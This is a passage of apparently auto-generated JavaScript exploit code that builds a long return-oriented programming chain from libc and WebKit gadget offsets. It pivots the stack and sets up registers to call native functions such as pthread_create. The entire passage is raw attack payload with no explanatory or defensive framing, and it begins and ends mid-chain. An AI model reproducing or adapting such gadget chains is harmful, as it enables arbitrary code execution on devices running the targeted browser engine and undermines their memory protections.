set_gadget(libc_base+772328,);
//L2162:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+151816,//L2164
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+151848,//L2166
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+151800,//L2163
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+151832,//L2165
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2163:
db([0,0]);
set_gadget(libc_base+165442,);
//L2164:
db([0,0]);
set_gadget(libc_base+772328,);
//L2165:
db([0,0]);
set_gadget(libc_base+768796,);
//L2166:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+151944,//L2168
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+151928,//L2167
webkit_base+4687784,
libc_base+165442
]);
//L2167:
db([0,0]);
set_gadget(libc_base+768796,);
//L2168:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2170:
db([15,0]);// 0xf
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+152056,//L2172
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2172:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+72932,//or rax,rcx
libc_base+713278,
ropchain+152208,//L2174
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+152224,//L2175
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+152192,//L2173
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2173:
db([0,0]);
set_gadget(libc_base+165442,);
//L2174:
db([0,0]);
set_gadget(libc_base+768796,);
//L2175:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+152344,//L2179
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+152328,//L2178
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2176:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+165442,);
//L2178:
db([0,0]);
set_gadget(libc_base+772328,);
//L2179:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2180:
db([4294967284,4294967295]);// -0xc
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+152472,//L2183
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+152488,//L2184
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2183:
db([0,0]);
set_gadget(libc_base+772328,);
//L2184:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+152648,//L2186
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+152680,//L2188
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+152632,//L2185
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+152664,//L2187
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2185:
db([0,0]);
set_gadget(libc_base+165442,);
//L2186:
db([0,0]);
set_gadget(libc_base+772328,);
//L2187:
db([0,0]);
set_gadget(libc_base+768796,);
//L2188:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+152776,//L2190
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+152760,//L2189
webkit_base+4687784,
libc_base+165442
]);
//L2189:
db([0,0]);
set_gadget(libc_base+768796,);
//L2190:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2191:
db([1,0]);// 0x1
set_gadget(libc_base+772328,);
//L2192:
db([1,0]);// 0x1
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+153000,//L2194
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+153016,//L2195
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+152984,//L2193
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2193:
db([0,0]);
set_gadget(libc_base+165442,);
//L2194:
db([0,0]);
set_gadget(libc_base+768796,);
//L2195:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+153136,//L2199
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+153120,//L2198
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2196:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+165442,);
//L2198:
db([0,0]);
set_gadget(libc_base+772328,);
//L2199:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2200:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L2202:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+153280,//L2204
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+153296,//L2205
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2204:
db([0,0]);
set_gadget(libc_base+772328,);
//L2205:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+153440,//L2208
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+153408,//L2206
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+153424,//L2207
webkit_base+4687784,
libc_base+165442
]);
//L2206:
db([0,0]);
set_gadget(libc_base+772328,);
//L2207:
db([0,0]);
set_gadget(libc_base+768796,);
//L2208:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+153512,//L2210
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2210:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+153568,//L2212
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2212:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+153664,//L2215
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2213:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+772328,);
//L2215:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+153752,//L2217
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+153768,//L2218
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2217:
db([0,0]);
set_gadget(libc_base+772328,);
//L2218:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+153928,//L2220
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+153960,//L2222
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+153912,//L2219
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+153944,//L2221
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2219:
db([0,0]);
set_gadget(libc_base+165442,);
//L2220:
db([0,0]);
set_gadget(libc_base+772328,);
//L2221:
db([0,0]);
set_gadget(libc_base+768796,);
//L2222:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+154088,//L2224
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+154104,//L2225
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+154072,//L2223
webkit_base+4687784,
libc_base+165442
]);
//L2223:
db([0,0]);
set_gadget(libc_base+772328,);
//L2224:
db([0,0]);
set_gadget(libc_base+768796,);
//L2225:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+154192,//L2227
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2227:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+154248,//L2229
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2229:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+154336,//L2232
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2230:
db([4294967272,4294967295]);// -0x18
set_gadget(libc_base+772328,);
//L2232:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2233:
db([40,0]);// 0x28
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+154464,//L2236
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+154480,//L2237
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2236:
db([0,0]);
set_gadget(libc_base+772328,);
//L2237:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+154624,//L2240
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+154592,//L2238
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+154608,//L2239
webkit_base+4687784,
libc_base+165442
]);
//L2238:
db([0,0]);
set_gadget(libc_base+772328,);
//L2239:
db([0,0]);
set_gadget(libc_base+768796,);
//L2240:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+154720,//L2243
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2241:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L2243:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+154808,//L2245
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+154824,//L2246
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2245:
db([0,0]);
set_gadget(libc_base+772328,);
//L2246:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+154968,//L2249
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+154936,//L2247
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+154952,//L2248
webkit_base+4687784,
libc_base+165442
]);
//L2247:
db([0,0]);
set_gadget(libc_base+772328,);
//L2248:
db([0,0]);
set_gadget(libc_base+768796,);
//L2249:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+155040,//L2251
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2251:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+155096,//L2253
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2253:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+155192,//L2256
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2254:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+772328,);
//L2256:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+155280,//L2258
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+155296,//L2259
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2258:
db([0,0]);
set_gadget(libc_base+772328,);
//L2259:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+155456,//L2261
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+155488,//L2263
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+155440,//L2260
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+155472,//L2262
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2260:
db([0,0]);
set_gadget(libc_base+165442,);
//L2261:
db([0,0]);
set_gadget(libc_base+772328,);
//L2262:
db([0,0]);
set_gadget(libc_base+768796,);
//L2263:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+155616,//L2265
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+155632,//L2266
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+155600,//L2264
webkit_base+4687784,
libc_base+165442
]);
//L2264:
db([0,0]);
set_gadget(libc_base+772328,);
//L2265:
db([0,0]);
set_gadget(libc_base+768796,);
//L2266:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+155720,//L2268
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2268:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+155776,//L2270
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2270:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+155872,//L2272
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2272:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+155928,//L2274
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2274:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2275:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L2276:
db([16,0]);// 0x10
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+156080,//L2278
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2278:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+156136,//L2280
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2280:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+156256,//L2283
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2281:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L2283:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+156344,//L2285
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+156360,//L2286
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2285:
db([0,0]);
set_gadget(libc_base+772328,);
//L2286:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+156504,//L2289
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+156472,//L2287
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+156488,//L2288
webkit_base+4687784,
libc_base+165442
]);
//L2287:
db([0,0]);
set_gadget(libc_base+772328,);
//L2288:
db([0,0]);
set_gadget(libc_base+768796,);
//L2289:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+156600,//L2292
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2290:
db([4294967272,4294967295]);// -0x18
set_gadget(libc_base+772328,);
//L2292:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+156688,//L2294
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+156704,//L2295
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2294:
db([0,0]);
set_gadget(libc_base+772328,);
//L2295:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+156848,//L2298
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+156816,//L2296
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+156832,//L2297
webkit_base+4687784,
libc_base+165442
]);
//L2296:
db([0,0]);
set_gadget(libc_base+772328,);
//L2297:
db([0,0]);
set_gadget(libc_base+768796,);
//L2298:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L2300:
ropchain+156952,//L2299
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+86896,//_create_extcall
//L2299:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967264,4294967295]);// -0x20
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+157040,//L2303
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2301:
db([4294967272,4294967295]);// -0x18
set_gadget(libc_base+772328,);
//L2303:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+157128,//L2305
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+157144,//L2306
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2305:
db([0,0]);
set_gadget(libc_base+772328,);
//L2306:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+157288,//L2309
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+157256,//L2307
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+157272,//L2308
webkit_base+4687784,
libc_base+165442
]);
//L2307:
db([0,0]);
set_gadget(libc_base+772328,);
//L2308:
db([0,0]);
set_gadget(libc_base+768796,);
//L2309:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L2310:
jop_frame_addr,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+157432,//L2313
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2311:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L2313:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+157520,//L2315
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+157536,//L2316
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2315:
db([0,0]);
set_gadget(libc_base+772328,);
//L2316:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+157680,//L2319
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+157648,//L2317
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+157664,//L2318
webkit_base+4687784,
libc_base+165442
]);
//L2317:
db([0,0]);
set_gadget(libc_base+772328,);
//L2318:
db([0,0]);
set_gadget(libc_base+768796,);
//L2319:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+157776,//L2322
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2320:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L2322:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+157864,//L2324
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+157880,//L2325
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2324:
db([0,0]);
set_gadget(libc_base+772328,);
//L2325:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+158024,//L2328
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+157992,//L2326
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+158008,//L2327
webkit_base+4687784,
libc_base+165442
]);
//L2326:
db([0,0]);
set_gadget(libc_base+772328,);
//L2327:
db([0,0]);
set_gadget(libc_base+768796,);
//L2328:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L2330:
ropchain+158128,//L2329
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+159008,//L2331
//L2329:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967264,4294967295]);// -0x20
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+158272,//L2333
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+158288,//L2334
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+158256,//L2332
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2332:
db([0,0]);
set_gadget(libc_base+165442,);
//L2333:
db([0,0]);
set_gadget(libc_base+768796,);
//L2334:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+158416,//L2336
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+158432,//L2337
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+158400,//L2335
webkit_base+4687784,
libc_base+165442
]);
//L2335:
db([0,0]);
set_gadget(libc_base+772328,);
//L2336:
db([0,0]);
set_gadget(libc_base+768796,);
//L2337:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+158536,//L2338
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+158552,//L2339
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2338:
db([0,0]);
set_gadget(libc_base+768796,);
//L2339:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+158672,//L2340
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+158656,//L2341
webkit_base+4687784,
libc_base+768796
]);
//L2341:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2340:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+158760,//L2343
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+158744,//L2342
webkit_base+4687784,
libc_base+165442
]);
//L2342:
db([0,0]);
set_gadget(libc_base+768796,);
//L2343:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+158864,//L2344
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+158880,//L2345
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2344:
db([0,0]);
set_gadget(libc_base+768796,);
//L2345:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+159000,//L2346
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+158984,//L2347
webkit_base+4687784,
libc_base+768796
]);
//L2347:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2346:
db([0,0]);
//L2331:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
pthread_create_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
